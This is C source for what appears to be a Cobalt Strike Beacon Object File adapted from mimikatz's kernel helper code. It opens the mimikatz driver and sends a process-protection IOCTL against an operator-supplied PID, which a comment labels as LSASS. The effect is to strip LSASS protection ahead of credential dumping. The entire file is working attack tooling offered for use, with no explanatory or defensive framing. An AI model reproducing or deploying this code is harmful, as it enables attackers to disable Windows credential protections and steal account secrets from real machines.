
#include "entry.h"

BOOL kull_m_kernel_ioctl_handle(HANDLE hDriver, DWORD ioctlCode, PVOID bufferIn, DWORD szBufferIn, PVOID * pBufferOut, PDWORD pSzBufferOut, BOOL autobuffer)
{
	BOOL status = FALSE;
	DWORD lStatus = ERROR_MORE_DATA, returned;

	if(!autobuffer)
	{
		status = DeviceIoControl(hDriver, ioctlCode, bufferIn, szBufferIn, pBufferOut ? *pBufferOut : NULL, pSzBufferOut ? *pSzBufferOut : 0, &returned, NULL);
	}
	else
	{
		for(*pSzBufferOut = 0x10000; (lStatus == ERROR_MORE_DATA) && (*pBufferOut = LocalAlloc(LPTR, *pSzBufferOut)) ; *pSzBufferOut <<= 1)
		{
			status = DeviceIoControl(hDriver, ioctlCode, bufferIn, szBufferIn, *pBufferOut, *pSzBufferOut, &returned, NULL);
			if(status)
			{
				lStatus = ERROR_SUCCESS;
			}
			else
			{
				lStatus = GetLastError();
				if(lStatus == ERROR_MORE_DATA)
				{
					LocalFree(*pBufferOut);
				}
			}
		}
	}
	if(!status)
	{
		BeaconPrintf(CALLBACK_ERROR, "DeviceIoControl");
		if(autobuffer)
		{
			LocalFree(*pBufferOut);
		}
	}
	else if(pSzBufferOut)
	{
		*pSzBufferOut = returned;
	}
	return status;
}

BOOL kull_m_kernel_ioctl(PCWSTR driver, DWORD ioctlCode, PVOID bufferIn, DWORD szBufferIn, PVOID * pBufferOut, PDWORD pSzBufferOut, BOOL autobuffer)
{
	BOOL status = FALSE;
	HANDLE hDriver;
	hDriver = CreateFileW(driver, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
	if(hDriver && hDriver != INVALID_HANDLE_VALUE)
	{
		status = kull_m_kernel_ioctl_handle(hDriver, ioctlCode, bufferIn, szBufferIn, pBufferOut, pSzBufferOut, autobuffer);
		CloseHandle(hDriver);
	}
	else
	{
		BeaconPrintf(CALLBACK_ERROR, "CreateFile");
	}
	return status;
}

BOOL kull_m_kernel_mimidrv_simple_output(DWORD ioctlCode, PVOID bufferIn, DWORD szBufferIn)
{
	BOOL status = FALSE;
	PVOID buffer = NULL;
	DWORD szBuffer;

	status = kull_m_kernel_ioctl(L"\\\\.\\" MIMIKATZ_DRIVER, ioctlCode, bufferIn, szBufferIn, &buffer, &szBuffer, TRUE);
	if(status)
	{
		//for(i = 0; i < szBuffer / sizeof(wchar_t); i++)
		//	kprintf(L"%c", ((wchar_t *) buffer)[i]);
		LocalFree(buffer);
	}
	return status;
}

void go(char* args, int length)
{
	datap parser;
	MIMIDRV_PROCESS_PROTECT_INFORMATION protectInfos = {0, {0, 0, {0, 0, 0}}};
	BOOL ret_val = FALSE;
    BeaconDataParse(&parser, args, length);
	protectInfos.processId = BeaconDataInt(&parser); // LSASS PID

	ret_val = kull_m_kernel_mimidrv_simple_output(IOCTL_MIMIDRV_PROCESS_PROTECT, &protectInfos, sizeof(MIMIDRV_PROCESS_PROTECT_INFORMATION));
	BeaconPrintf(CALLBACK_OUTPUT, "Result: %d", ret_val);

	return;
}
